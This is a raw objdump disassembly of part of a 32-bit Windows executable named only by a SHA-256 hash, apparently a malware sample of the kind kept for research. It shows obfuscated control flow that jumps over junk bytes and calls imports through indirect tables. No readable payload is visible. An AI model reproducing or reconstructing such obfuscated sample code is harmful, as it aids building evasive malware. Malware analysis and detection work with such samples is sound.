
1e44f9339aab6e8932b7dd9cb447ed29f929a5972d6e56b25d77c3d109a5d02a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	adc    ecx,0x4d2f
  40100a:	add    BYTE PTR [eax],al
  40100c:	add    al,BYTE PTR [eax]
  40100e:	add    BYTE PTR [eax],al
  401010:	cmp    al,BYTE PTR [eax]
  401012:	add    BYTE PTR [eax],al
  401014:	add    BYTE PTR [eax],al
  401016:	add    DWORD PTR [eax],eax
  401018:	add    BYTE PTR [edx-0x74ab0000],bh
  40101e:	in     al,dx
  40101f:	sub    esp,0x30
  401022:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  401029:	mov    eax,ds:0x44e414
  40102e:	adc    eax,DWORD PTR ds:0x44e428
  401034:	mov    ds:0x44e414,eax
  401039:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  401040:	xor    ecx,0x17d8
  401046:	mov    ecx,DWORD PTR [ebp-0x4]
  401049:	push   ebx
  40104a:	and    DWORD PTR ds:0x448994,0x0
  401054:	xor    eax,eax
  401056:	add    eax,DWORD PTR ds:0x448994
  40105c:	inc    eax
  40105d:	mov    ds:0x448994,eax
  401062:	cmp    DWORD PTR ds:0x448994,0xa
  401069:	jne    0x40108c
  40106f:	push   DWORD PTR [ebp-0x10]
  401072:	push   DWORD PTR [ebp-0x28]
  401075:	push   DWORD PTR [ebp-0x20]
  401078:	push   0x74f6
  40107d:	push   DWORD PTR [ebp-0x24]
  401080:	push   DWORD PTR [ebp-0x28]
  401083:	push   DWORD PTR [ebp-0x20]
  401086:	call   DWORD PTR ds:0x4430c4
  40108c:	cmp    DWORD PTR ds:0x448994,0x9
  401093:	jne    0x4010a4
  401099:	mov    eax,ds:0x448994
  40109e:	inc    eax
  40109f:	mov    ds:0x448994,eax
  4010a4:	cmp    DWORD PTR ds:0x448994,0x17
  4010ab:	jb     0x401054
  4010b1:	add    DWORD PTR ds:0x448980,ecx
  4010b7:	mov    eax,0x7510857
  4010bc:	xor    ecx,eax
  4010be:	xor    DWORD PTR ds:0x44b6dc,0x226
  4010c8:	mov    ebx,0x32729e
  4010cd:	not    DWORD PTR ds:0x44b6e0
  4010d3:	jmp    0x4011a6
  4010d8:	dec    esi
  4010d9:	dec    edx
  4010da:	xor    al,0x5c
  4010dc:	fcom   DWORD PTR [edx+0x66]
  4010df:	jp     0x4010bd
  4010e1:	test   DWORD PTR [ebx+0x58],0x6da2a035
  4010e8:	jl     0x401166
  4010ea:	jl     0x401168
  4010ec:	mov    ds:0xcc7c7c7c,al
  4010f1:	(bad)  
  4010f2:	xor    ecx,ebx
  4010f4:	xor    eax,0xccddcfdb
  4010f9:	ja     0x401171
  4010fb:	or     ecx,DWORD PTR [edi]
  4010fd:	outs   dx,BYTE PTR ds:[esi]
  4010fe:	or     cl,BYTE PTR [edi]
  401100:	cmp    ecx,DWORD PTR [edi]
  401102:	retf   0x3712
  401105:	sbb    bl,BYTE PTR [edi]
  401107:	mov    ch,0x52
  401109:	or     ah,BYTE PTR [edi-0x4e10f32f]
  40110f:	rol    esp,cl
  401111:	or     ecx,DWORD PTR [esp+edx*1+0x4da8e6bc]
  401118:	sbb    DWORD PTR [ecx+0x541fb4dc],esp
  40111e:	out    dx,al
  40111f:	outs   dx,DWORD PTR ds:[esi]
  401120:	add    ebx,DWORD PTR ds:0x4ac4729e
  401126:	mov    al,ds:0x36dd215b
  40112b:	mov    eax,ds:0xa3c97380
  401131:	je     0x401169
  401133:	fisttp DWORD PTR [ebp+0x359ac4f5]
  401139:	jecxz  0x401175
  40113b:	and    ebp,0x4f
  40113e:	aam    0x94
  401140:	dec    ebp
  401141:	inc    DWORD PTR [edi-0x2f5a886e]
  401147:	mov    cl,0x41
  401149:	loope  0x40116f
  40114b:	pop    ecx
  40114c:	sub    edi,DWORD PTR [eax-0x41639320]
  401152:	jae    0x401171
  401154:	retf   
  401155:	cwde   
  401156:	sub    eax,0xc85ce3c6
  40115b:	(bad)  
  40115c:	mov    dl,0xfa
  40115e:	loopne 0x4010f8
  401160:	cmp    eax,0xc76966cf
  401165:	sub    al,cl
  401167:	or     ch,dl
  401169:	sbb    eax,0xb39945d
  40116e:	outs   dx,DWORD PTR ds:[esi]
  40116f:	ins    DWORD PTR es:[edi],dx
  401170:	jb     0x401174
  401172:	cmp    eax,0x22468cd1
  401177:	jns    0x4011f8
  401179:	cmp    al,0x8f
  40117b:	add    bl,dl
  40117d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40117e:	add    edx,DWORD PTR [ebx+0x59]
  401181:	rol    esp,1
  401183:	add    eax,0x15d55edb
  401188:	jge    0x401126
  40118a:	mov    ah,0x43
  40118c:	daa    
  40118d:	sbb    DWORD PTR [ebx],esp
  40118f:	addr16 and eax,0x4f3cdb10
  401195:	loop   0x401165
  401197:	xchg   esi,eax
  401198:	push   ebp
  401199:	pop    edi
  40119a:	fldcw  WORD PTR [edi+eiz*8-0x77]
  40119e:	nop
  40119f:	je     0x401198
  4011a1:	mov    edi,0x3b3a0040
  4011a6:	add    ecx,ebx
  4011a8:	adc    DWORD PTR ds:0x4247ce,0x44e418
  4011b2:	mov    DWORD PTR [ebp-0x1c],ecx
  4011b5:	xor    DWORD PTR ds:0x41074f,0x5a6f
  4011bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4011c2:	adc    DWORD PTR ds:0x44e414,0x4247ca
  4011cc:	jmp    0x40129f
  4011d1:	inc    edi
  4011d2:	in     eax,0x24
  4011d4:	xor    bh,BYTE PTR [edx+0x6b7d7dcd]
  4011da:	inc    ebp
  4011db:	in     al,dx
  4011dc:	xchg   ah,ah
  4011de:	inc    esp
  4011df:	imul   eax,DWORD PTR [eax],0x7c7c7ca2
  4011e5:	mov    ds:0x967c7c7c,al
  4011ea:	arpl   WORD PTR [eax+esi*1],cx
  4011ed:	pmuludq mm4,mm3
  4011f0:	mov    dh,0xb3
  4011f2:	mov    ah,BYTE PTR cs:[edi]
  4011f5:	dec    ebx
  4011f6:	mov    ebp,0x74f4daf4
  4011fb:	adc    al,BYTE PTR [edi-0x32]
  4011fe:	pop    edx
  4011ff:	nop
  401200:	fild   DWORD PTR [esi]
  401202:	cli    
  401203:	jb     0x401214
  401205:	add    ebp,DWORD PTR [edx+0x35]
  401208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401209:	xchg   BYTE PTR ds:0x6261679a,ah
  40120f:	and    BYTE PTR [eax],al
  401211:	mov    al,ds:0xa9a7e66a
  401216:	mov    ecx,0xbe9f452
  40121b:	mov    ch,0x1d
  40121d:	enter  0xc0e3,0x7f
  401221:	add    al,BYTE PTR [eax]
  401223:	add    al,0x59
  401225:	xor    esi,esi
  401227:	inc    ecx
  401228:	jle    0x40129d
  40122a:	rep lods eax,DWORD PTR ds:[esi]
  40122c:	cld    
  40122d:	aaa    
  40122e:	test   BYTE PTR [ebx-0x28],0x2f
  401232:	xchg   BYTE PTR [esi],cl
  401234:	jmp    0xd0fe:0x96117020
  40123b:	push   ebp
  40123c:	jbe    0x4012a4
  40123e:	rcr    DWORD PTR [ebx-0x59affacb],cl
  401244:	jmp    0x2024dee6
  401249:	out    dx,eax
  40124a:	xchg   DWORD PTR [ecx+0xa89b5e6],ebp
  401250:	pop    edi
  401251:	mov    edx,0xb7c7eedf
  401256:	mov    BYTE PTR [ecx+eax*8+0x8a3887c],0xab
  40125e:	jecxz  0x40122e
  401260:	in     eax,0xf0
  401262:	pusha  
  401263:	arpl   WORD PTR [ebp-0x30b4971d],cx
  401269:	jmp    0x6af8:0x5d0d374d
  401270:	sbb    DWORD PTR [esi-0x32],ebx
  401273:	stos   DWORD PTR es:[edi],eax
  401274:	aas    
  401275:	xchg   edx,eax
  401276:	or     DWORD PTR [ebx+0x77],0x8a8ce2a5
  40127d:	jg     0x401243
  40127f:	push   ds
  401280:	push   es
  401281:	xor    esi,DWORD PTR [edi]
  401283:	xor    bh,BYTE PTR [esi-0x6a96eaac]
  401289:	dec    ebx
  40128a:	dec    ebp
  40128b:	cld    
  40128c:	pushf  
  40128d:	jl     0x4012b5
  40128f:	dec    eax
  401290:	inc    ebp
  401291:	cmc    
  401292:	push   esp
  401293:	ins    BYTE PTR es:[edi],dx
  401294:	rol    BYTE PTR [ebp-0x63245710],cl
  40129a:	es imul ecx,eax,0x25
  40129e:	inc    ecx
  40129f:	push   esi
  4012a0:	push   edi
  4012a1:	test   ecx,ecx
  4012a3:	mov    DWORD PTR ds:0x4247d2,0x53ab
  4012ad:	je     0x401398
  4012b3:	and    ecx,ecx
  4012b5:	mov    ecx,DWORD PTR [ebp+0x14]
  4012b8:	and    edi,edi
  4012ba:	jmp    0x40138d
  4012bf:	xchg   DWORD PTR [edi-0x31],eax
  4012c2:	or     ecx,edi
  4012c4:	mov    ebx,DWORD PTR [ebx+0x5b]
  4012c7:	dec    esi
  4012c8:	popa   
  4012c9:	enter  0x1afc,0x97
  4012cd:	mov    ds:0x7c7fe887,eax
  4012d2:	jl     0x401276
  4012d4:	jl     0x401352
  4012d6:	jl     0x401259
  4012d8:	fsubr  QWORD PTR [edi-0x48187f15]
  4012de:	shl    al,1
  4012e0:	outs   dx,DWORD PTR ds:[esi]
  4012e1:	push   ebx
  4012e2:	push   esp
  4012e3:	and    ebx,ebp
  4012e5:	cmp    DWORD PTR [ebx],0xffffffdf
  4012e8:	cwde   
  4012e9:	cdq    
  4012ea:	push   esi
  4012eb:	pop    esp
  4012ec:	xchg   DWORD PTR [edi],ebp
  4012ee:	cwde   
  4012ef:	repz push edx
  4012f1:	les    esi,FWORD PTR [eax-0x78]
  4012f4:	into   
  4012f5:	(bad)  
  4012f6:	cmp    bh,bh
  4012f8:	push   eax
  4012f9:	not    BYTE PTR ds:0xe078b0d9
  4012ff:	pop    ecx
  401300:	add    cl,BYTE PTR [ebp-0x34ad41cd]
  401306:	aad    0xe3
  401308:	mov    DWORD PTR [ebx+eiz*1+0x5c],eax
  40130c:	push   ss
  40130d:	int3   
  40130e:	jmp    0x6c58eeb8
  401313:	dec    edx
  401314:	lds    edx,FWORD PTR [edx+0x2d3c9145]
  40131a:	cwde   
  40131b:	pop    edx
  40131c:	outs   dx,BYTE PTR ds:[esi]
  40131d:	pop    ebp
  40131e:	sub    edx,ecx
  401320:	or     DWORD PTR es:[eax+0x1f],ebx
  401324:	fiadd  DWORD PTR [ecx]
  401326:	fistp  QWORD PTR [esi+0x34]
  401329:	sbb    eax,0xa31e127d
  40132e:	shl    DWORD PTR [esi-0x367ec9ab],cl
  401334:	dec    esi
  401335:	imul   ecx,DWORD PTR [edx+0x37234c33],0xffffffed
  40133c:	add    al,0x6b
  40133e:	stc    
  40133f:	test   BYTE PTR [ebx-0x52f1618a],bl
  401345:	adc    DWORD PTR [edi+0x19],esp
  401348:	ins    BYTE PTR es:[edi],dx
  401349:	add    eax,DWORD PTR [esi+0x1560d1d3]
  40134f:	pop    edi
  401350:	test   DWORD PTR [ebp+0x5e],edi
  401353:	pushf  
  401354:	mov    WORD PTR [ebp-0x151a9e1c],ds
  40135a:	or     BYTE PTR [ecx+0x5ad526b],0x2a
  401361:	je     0x401390
  401363:	aaa    
  401364:	int3   
  401365:	cmp    eax,0x3303d1ae
  40136a:	lock mov BYTE PTR [edi-0x6c764923],ah
  401371:	fwait
  401372:	int3   
  401373:	sub    esi,DWORD PTR [ecx+ecx*4]
  401376:	(bad)  
  401377:	push   ebx
  401378:	fbld   TBYTE PTR [esi]
  40137a:	xor    ah,ch
  40137c:	(bad)  
  40137d:	mov    eax,0x83ff0812
  401382:	pop    esp
  401383:	jno    0x40132c
  401385:	pop    ecx
  401386:	xchg   edx,eax
  401387:	test   BYTE PTR [edi],dl
  401389:	jg     0x401341
  40138b:	ror    DWORD PTR [ebx+ecx*4],cl
  40138e:	or     DWORD PTR [ecx],ebp
  401390:	sbb    eax,0x41074f
  401395:	mov    DWORD PTR [ebp-0x1c],ecx
  401398:	sbb    esi,ecx
  40139a:	imul   edx,eax
  40139d:	and    DWORD PTR ds:0x4247ca,0x618e
  4013a7:	mov    ecx,0x4573
  4013ac:	mov    DWORD PTR ds:0x44b6d8,0x19
  4013b6:	cmp    DWORD PTR ds:0x44b6d8,0x0
  4013bd:	je     0x4013f3
  4013c3:	cmp    DWORD PTR ds:0x44b6d8,0x1a
  4013ca:	jne    0x4013d9
  4013d0:	push   DWORD PTR [ebp-0x1c]
  4013d3:	call   DWORD PTR ds:0x443338
  4013d9:	xor    edi,edi
  4013db:	or     edi,DWORD PTR ds:0x44b6d8
  4013e1:	dec    edi
  4013e2:	mov    DWORD PTR ds:0x44b6d8,edi
  4013e8:	jmp    0x4013b6
  4013ed:	xor    DWORD PTR ds:0x448980,edx
  4013f3:	add    edx,ecx
  4013f5:	inc    edi
  4013f6:	mov    esi,0x7879
  4013fb:	add    DWORD PTR ds:0x44b6e8,edx
  401401:	mov    edi,0x1556
  401406:	sub    DWORD PTR ds:0x4489a4,0x41074b
  401410:	xchg   esi,ecx
  401412:	xor    DWORD PTR ds:0x44e420,ecx
  401418:	sub    edx,edi
  40141a:	or     ecx,0x50d4
  401420:	xor    esi,esi
  401422:	mov    DWORD PTR [ebp-0x28],esi
  401425:	movzx  ecx,WORD PTR ds:0x44e420
  40142c:	xor    DWORD PTR ds:0x44e414,ecx
  401432:	mov    DWORD PTR [ebp-0x2c],esi
  401435:	or     ecx,0x6619
  40143b:	mov    DWORD PTR [ebp-0x14],esi
  40143e:	mov    ecx,DWORD PTR ds:0x410757
  401444:	xor    DWORD PTR ds:0x4247c2,ecx
  40144a:	jmp    0x40151d
  40144f:	ficom  WORD PTR [esi+0x7b7d5fa5]
  401455:	loop   0x401400
  401457:	sbb    al,0x21
  401459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40145a:	out    dx,eax
  40145b:	repnz pop ds
  40145d:	mov    cl,0x13
  40145f:	push   ds
  401460:	jle    0x4014de
  401462:	jl     0x401406
  401464:	jl     0x4014e2
  401466:	jl     0x4014b9
  401468:	sub    eax,0xc8ec3094
  40146d:	inc    edx
  40146e:	jl     0x401424
  401470:	cmp    BYTE PTR [ebx-0x5f71a0aa],dl
  401476:	jl     0x4014da
  401478:	dec    esp
  401479:	and    DWORD PTR [eax+0x76],esi
  40147c:	out    0x9c,al
  40147e:	push   es
  40147f:	std    
  401480:	or     BYTE PTR [edx+ecx*2],bh
  401483:	sbb    edx,eax
  401485:	fbstp  TBYTE PTR [ecx]
  401487:	mov    bl,0x20
  401489:	into   
  40148a:	jl     0x4014d1
  40148c:	pop    edx
  40148d:	pop    ecx
  40148e:	sub    BYTE PTR [ecx-0x2356a8cd],ch
  401494:	lds    ecx,FWORD PTR [edi+edx*1]
  401497:	in     eax,dx
  401498:	mov    esp,0xf0676de2
  40149d:	jle    0x401478
  40149f:	dec    ebx
  4014a0:	or     al,0xb3
  4014a2:	jle    0x401472
  4014a4:	je     0x4014c0
  4014a6:	cmc    
  4014a7:	cmp    eax,0x6a83de49
  4014ac:	fistp  QWORD PTR [esi+0x6d]
  4014af:	dec    ecx
  4014b0:	addr16 (bad) 
  4014b2:	push   cs
  4014b3:	mov    edi,0x94805cad
  4014b8:	jno    0x401476
  4014ba:	outs   dx,BYTE PTR ds:[esi]
  4014bb:	in     al,0x47
  4014bd:	ret    
  4014be:	das    
  4014bf:	jge    0x40150f
  4014c1:	lds    eax,FWORD PTR [edi-0x18fcd408]
  4014c7:	addr16 mov eax,0x35cf03c5
  4014cd:	mov    ah,ah
  4014cf:	mov    dh,0xb5
  4014d1:	in     eax,dx
  4014d2:	inc    ebp
  4014d3:	popf   
  4014d4:	arpl   WORD PTR [edx+0x770691c2],si
  4014da:	jmp    0x6ecc:0x1a1b0928
  4014e1:	xchg   esp,eax
  4014e2:	sub    eax,0xd880c08f
  4014e7:	and    eax,esp
  4014e9:	mov    BYTE PTR [eax+eiz*8-0x8],ah
  4014ed:	push   ebx
  4014ee:	test   DWORD PTR [eax+ecx*1-0x47],0xbb0768ea
  4014f6:	ret    
  4014f7:	dec    ebx
  4014f8:	call   0x9824:0xa8cbc8d8
  4014ff:	leave  
  401500:	mov    edx,0xf71d7b15
  401505:	das    
  401506:	xchg   ebx,eax
  401507:	imul   esp,DWORD PTR [edi+0x54],0x88cf563a
  40150e:	jno    0x401550
  401510:	dec    eax
  401511:	jg     0x401527
  401513:	fnstenv [eax]
  401515:	jge    0x401594
  401517:	mov    BYTE PTR [edi+0x41],dh
  40151a:	mov    bl,0x63
  40151c:	jns    0xcf2a0d97
  401522:	add    BYTE PTR [eax],al
  401524:	add    BYTE PTR [ecx],al
  401526:	cmp    bl,dh
  401528:	push   esp
  401529:	lods   eax,DWORD PTR ds:[esi]
  40152a:	addr16 std 
  40152c:	jge    0x401526
  40152e:	stc    
  40152f:	icebp  
  401530:	sahf   
  401531:	ss sub dh,bh
  401534:	in     al,0x44
  401536:	jle    0x4015b4
  401538:	jl     0x4014dc
  40153a:	jl     0x4015b8
  40153c:	jl     0x4015a2
  40153e:	adc    al,0xce
  401540:	je     0x4014cf
  401542:	pop    edx
  401543:	in     al,dx
  401544:	mov    ebx,0x3ee3fe65
  401549:	ror    bl,cl
  40154b:	push   ds
  40154c:	retf   
  40154d:	mov    bh,0xea
  40154f:	jbe    0x40154e
  401551:	repnz in al,0x1a
  401554:	xchg   ebx,esp
  401556:	xor    BYTE PTR [ecx-0x719b1415],al
  40155c:	fild   QWORD PTR [ecx+ecx*1]
  40155f:	aaa    
  401560:	mov    bl,0x70
  401562:	mov    edx,0xc38670a9
  401567:	sbb    eax,0xd83c9383
  40156c:	add    BYTE PTR [edx],0x33
  40156f:	test   DWORD PTR [ebx+0x9c3d4fe],ecx
  401575:	or     bh,dh
  401577:	xchg   edx,eax
  401578:	call   0x546e:0xbbbb7240
  40157f:	sub    al,0xa5
  401581:	into   
  401582:	vpcmpeqw xmm2,xmm4,XMMWORD PTR [edi-0x1f89b97f]
  40158a:	ss push ecx
  40158c:	fldcw  WORD PTR [edi]
  40158e:	mov    edi,DWORD PTR [ecx+0x6d]
  401591:	(bad)  
  401592:	int    0xc4
  401594:	dec    esi
  401595:	iret   
  401596:	and    ecx,eax
  401598:	xor    al,0x16
  40159a:	mov    bl,BYTE PTR [esi]
  40159c:	mov    eax,ds:0xff389397
  4015a1:	jns    0x401533
  4015a3:	out    dx,al
  4015a4:	js     0x401543
  4015a6:	xlat   BYTE PTR ds:[ebx]
  4015a7:	sbb    DWORD PTR [ecx],ebp
  4015a9:	mov    esi,0x1bf62cbb
  4015ae:	cmc    
  4015af:	in     eax,0x14
  4015b1:	push   esi
  4015b2:	std    
  4015b3:	pop    eax
  4015b4:	rcr    esi,cl
  4015b6:	(bad)  
  4015b7:	push   0xe2b16a9e
  4015bc:	or     DWORD PTR [edi+0xafb409d],0x45cd4acd
  4015c6:	(bad)  
  4015c7:	sub    bl,BYTE PTR [edi-0x69f0b7c7]
  4015cd:	push   esp
  4015ce:	pop    ebp
  4015cf:	jmp    DWORD PTR [eax+edi*4]
  4015d2:	or     dh,0x55
  4015d5:	fldcw  WORD PTR ds:0xd6f4b654
  4015db:	aad    0xea
  4015dd:	dec    ebx
  4015de:	retf   
  4015df:	sub    ebx,DWORD PTR [edi]
  4015e1:	call   0x6e15:0x6f301d61
  4015e8:	in     al,dx
  4015e9:	ss mov esi,0x7ecafd9
  4015ef:	rcl    BYTE PTR [edx],1
  4015f1:	std    
  4015f2:	lods   al,BYTE PTR ds:[esi]
  4015f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4015f6:	sbb    DWORD PTR ds:0x410743,0x410747
  401600:	xor    ecx,eax
  401602:	mov    DWORD PTR ds:0x41074b,0x13
  40160c:	cmp    DWORD PTR ds:0x41074b,0x0
  401613:	je     0x401657
  401619:	cmp    DWORD PTR ds:0x41074b,0x2
  401620:	jne    0x40162f
  401626:	push   DWORD PTR [ebp-0xc]
  401629:	call   DWORD PTR ds:0x44333c
  40162f:	cmp    DWORD PTR ds:0x41074b,0x3
  401636:	jne    0x401647
  40163c:	mov    eax,ds:0x41074b
  401641:	dec    eax
  401642:	mov    ds:0x41074b,eax
  401647:	mov    eax,ds:0x41074b
  40164c:	dec    eax
  40164d:	mov    ds:0x41074b,eax
  401652:	jmp    0x40160c
  401657:	xor    edi,edi
  401659:	add    ecx,ebx
  40165b:	mov    eax,ds:0x4247d6
  401660:	mov    DWORD PTR [ebp-0x20],ecx
  401663:	mov    eax,DWORD PTR [ebp-0x20]
  401666:	mov    DWORD PTR ds:0x410747,0x348
  401670:	je     0x402298
  401676:	mov    eax,DWORD PTR [ebp-0x4]
  401679:	xor    DWORD PTR ds:0x44b6d8,0x44e410
  401683:	xor    eax,0x7510857
  401688:	jmp    0x40175b
  40168d:	in     eax,0x57
  40168f:	iret   
  401690:	call   0x2571:0x577dba5d
  401697:	mov    esi,0x7c525a6a
  40169c:	jecxz  0x401628
  40169e:	jno    0x40171c
  4016a0:	jl     0x401644
  4016a2:	jl     0x401720
  4016a4:	jl     0x401675
  4016a6:	out    0xf1,eax
  4016a8:	sbb    BYTE PTR [ecx],al
  4016aa:	cmc    
  4016ab:	pop    esi
  4016ac:	and    al,0x25
  4016ae:	test   eax,0x57696500
  4016b3:	lahf   
  4016b4:	or     eax,0xbc2a579
  4016b9:	or     eax,0xd3b2f404
  4016be:	dec    edx
  4016bf:	inc    esi
  4016c0:	sbb    DWORD PTR [edi-0x5cc5aa95],ebp
  4016c6:	add    DWORD PTR [ecx+0x76804195],esi
  4016cc:	xor    eax,0xf2885214
  4016d1:	and    eax,0x6211810b
  4016d6:	cmp    al,BYTE PTR [eax+0x2f]
  4016d9:	xor    bl,BYTE PTR [eax-0x486bb647]
  4016df:	imul   esp,DWORD PTR ds:0xd264882f,0x2ca7f409
  4016e9:	cmp    dh,BYTE PTR [ebx-0x4e]
  4016ec:	cmp    al,0xb9
  4016ee:	loope  0x4016ac
  4016f0:	or     ebp,DWORD PTR [edi+0x24761e56]
  4016f6:	mov    eax,0x3338a17
  4016fb:	mov    bh,0xdf
  4016fd:	cdq    
  4016fe:	mov    DWORD PTR [ebp+0x5b499614],ebx
  401704:	psllw  mm1,QWORD PTR [ebp-0x3a]
  401708:	xor    BYTE PTR [edx+0x6aa74e42],0xed
  40170f:	xchg   ebp,eax
  401710:	loope  0x401783
  401712:	mov    al,ds:0x4ac41b9e
  401717:	scas   eax,DWORD PTR es:[edi]
  401718:	jae    0x40174b
  40171a:	in     eax,dx
  40171b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40171c:	dec    ecx
  40171d:	xor    eax,DWORD PTR [edi-0x29]
  401720:	xchg   ebp,eax
  401721:	cmp    eax,0x43d28ab5
  401726:	adc    ebp,DWORD PTR [eax+0x538bf833]
  40172c:	inc    ebx
  40172d:	jo     0x401786
  40172f:	inc    eax
  401730:	test   BYTE PTR [esi+0xb7fb24c],0xfc
  401737:	dec    esi
  401738:	jl     0x40175b
  40173a:	sti    
  40173b:	cwde   
  40173c:	loope  0x4016e4
  40173e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40173f:	pop    esp
  401740:	sahf   
  401741:	mov    al,0x67
  401743:	sbb    DWORD PTR [edi-0x66c1f488],esp
  401749:	mov    edx,0x56cd6bdc
  40174e:	jne    0x401795
  401750:	inc    ecx
  401751:	aad    0x21
  401753:	dec    ebx
  401754:	stc    
  401755:	lds    edx,FWORD PTR [ebp+edx*4+0x36dd1c1]
  40175c:	ret    
  40175d:	mov    DWORD PTR ds:0x4489a4,0x156f
  401767:	cmp    edi,eax
  401769:	mov    DWORD PTR ds:0x44e414,0x5e58
  401773:	jne    0x401eef
  401779:	push   DWORD PTR [ebp+0x8]
  40177c:	add    DWORD PTR ds:0x44b6e4,0x4489a0
  401786:	call   0x409b25
  40178b:	mov    DWORD PTR ds:0x44e414,0x72d4
  401795:	mov    DWORD PTR [ebp-0x20],eax
  401798:	and    DWORD PTR ds:0x41073f,0x0
  4017a2:	jmp    0x4017b4
  4017a7:	mov    ecx,DWORD PTR ds:0x41073f
  4017ad:	inc    ecx
  4017ae:	mov    DWORD PTR ds:0x41073f,ecx
  4017b4:	cmp    DWORD PTR ds:0x41073f,0x16
  4017bb:	jae    0x4018af
  4017c1:	cmp    DWORD PTR ds:0x41073f,0x25
  4017c8:	jne    0x4017d7
  4017ce:	push   DWORD PTR [ebp-0x1c]
  4017d1:	call   DWORD PTR ds:0x443340
  4017d7:	jmp    0x4017a7
  4017dc:	jmp    0x4018af
  4017e1:	fdiv   st(2),st
  4017e3:	jmp    0xef7a:0x5462fa52
  4017ea:	into   
  4017eb:	outs   dx,DWORD PTR ds:[esi]
  4017ec:	inc    ecx
  4017ed:	aaa    
  4017ee:	jns    0x4017b3
  4017f0:	jp     0x401822
  4017f2:	jo     0x401870
  4017f4:	jl     0x401798
  4017f6:	jl     0x401874
  4017f8:	jl     0x401863
  4017fa:	push   es
  4017fb:	daa    
  4017fc:	adc    BYTE PTR [ebx],ch
  4017fe:	jno    0x401829
  401800:	sbb    esp,DWORD PTR [esi+0x2f]
  401803:	nop
  401804:	adc    DWORD PTR [esi+0x51],0x47
  401808:	or     al,0xd6
  40180a:	js     0x4017f0
  40180c:	cmc    
  40180d:	cmp    ah,ch
  40180f:	jae    0x401868
  401811:	cdq    
  401812:	leave  
  401813:	xor    esp,ebx
  401815:	xchg   bl,al
  401817:	push   cs
  401818:	dec    edx
  401819:	adc    eax,0x2051bbdc
  40181e:	xor    dl,bl
  401820:	mov    al,ds:0x85bc99d1
  401825:	outs   dx,DWORD PTR ds:[esi]
  401826:	out    dx,al
  401827:	pop    es
  401828:	xchg   ebp,eax
  401829:	int3   
  40182a:	and    eax,0xab433128
  40182f:	mov    ds:0xc2701cd1,eax
  401834:	adc    BYTE PTR [edx+0x72],0x1d
  401838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401839:	push   ecx
  40183a:	mov    ecx,DWORD PTR [edi+0x34]
  40183d:	xlat   BYTE PTR ds:[ebx]
  40183e:	xor    BYTE PTR [eax],cl
  401840:	push   es
  401841:	in     al,dx
  401842:	jp     0x40180e
  401844:	pop    esp
  401845:	mov    ds:0xd7967e8e,al
  40184a:	xor    DWORD PTR [eax-0x74],esi
  40184d:	pop    ebx
  40184e:	hlt    
  40184f:	mov    edi,0xf59fbd2a
  401854:	push   0x2c94bddf
  401859:	add    dl,bl
  40185b:	mov    ?,WORD PTR [ecx+ecx*1-0x80]
  40185f:	adc    eax,0x50c2f34
  401864:	sub    al,BYTE PTR [ebx-0x74eaff8a]
  40186a:	dec    esi
  40186b:	xor    esi,DWORD PTR gs:[ebp+0x16]
  40186f:	data16 adc bh,ch
  401872:	icebp  
  401873:	push   ebx
  401874:	jge    0x40185e
  401876:	lahf   
  401877:	adc    BYTE PTR [edi+0x28],cl
  40187a:	test   eax,0xa2c08dd
  40187f:	sbb    eax,0x965a8ce4
  401884:	inc    edx
  401885:	push   0x45be8235
  40188a:	or     eax,0xa9f000e7
  40188f:	int    0x8b
  401891:	pop    ss
  401892:	xor    esi,DWORD PTR [ecx-0x4e12646a]
  401898:	mov    ds:0xd6aac00e,al
  40189d:	inc    ebp
  40189e:	loope  0x40191d
  4018a0:	in     al,dx
  4018a1:	int3   
  4018a2:	mov    BYTE PTR [esi-0x5],bh
  4018a5:	dec    esi
  4018a6:	dec    esi
  4018a7:	add    al,0xfc
  4018a9:	sete   BYTE PTR fs:[esi+0x57]
  4018ae:	mov    ax,WORD PTR [ebp-0x4]
  4018b2:	xor    DWORD PTR ds:0x44e40c,edi
  4018b8:	mov    ecx,DWORD PTR [ebp-0x20]
  4018bb:	adc    DWORD PTR ds:0x44b6d4,ebx
  4018c1:	mov    esi,0x7510857
  4018c6:	xor    eax,esi
  4018c8:	adc    DWORD PTR ds:0x44898c,0x4247d6
  4018d2:	add    eax,ebx
  4018d4:	mov    DWORD PTR ds:0x448998,0x1172
  4018de:	cmp    ecx,eax
  4018e0:	mov    DWORD PTR ds:0x44899c,0x309e
  4018ea:	je     0x4021a9
  4018f0:	sub    DWORD PTR ds:0x41074b,0x410743
  4018fa:	push   DWORD PTR [ebp-0x20]
  4018fd:	jmp    0x4019d0
  401902:	js     0x40197b
  401904:	dec    ecx
  401905:	mov    bh,BYTE PTR [ebp+0x4a]
  401908:	jnp    0x401903
  40190a:	hlt    
  40190b:	push   esi
  40190c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40190d:	imul   eax,DWORD PTR [ebp-0x3],0x2f
  401911:	(bad)  [esi+0x70]
  401914:	jl     0x401992
  401916:	mov    ds:0xf7c7c7c,al
  40191b:	add    bh,ah
  40191d:	xor    esp,esi
  40191f:	jne    0x401989
  401921:	imul   ecx,DWORD PTR [esi],0x2c765b97
  401927:	(bad)  
  401928:	stos   BYTE PTR es:[edi],al
  401929:	inc    edi
  40192a:	into   
  40192b:	pop    esp
  40192c:	mov    ebp,?
  40192e:	enter  0xca5d,0x22
  401932:	stc    
  401933:	out    0xff,al
  401935:	jno    0x401917
  401937:	sub    BYTE PTR [ecx],dh
  401939:	outs   dx,BYTE PTR ds:[esi]
  40193a:	mov    eax,0x8e17b493
  40193f:	jl     0x40196d
  401941:	outs   dx,BYTE PTR ds:[esi]
  401942:	mov    ds:0xcf53040b,eax
  401947:	cld    
  401948:	in     eax,dx
  401949:	pusha  
  40194a:	lods   al,BYTE PTR ds:[esi]
  40194b:	test   al,0xd8
  40194d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40194e:	xchg   ebx,eax
  40194f:	pusha  
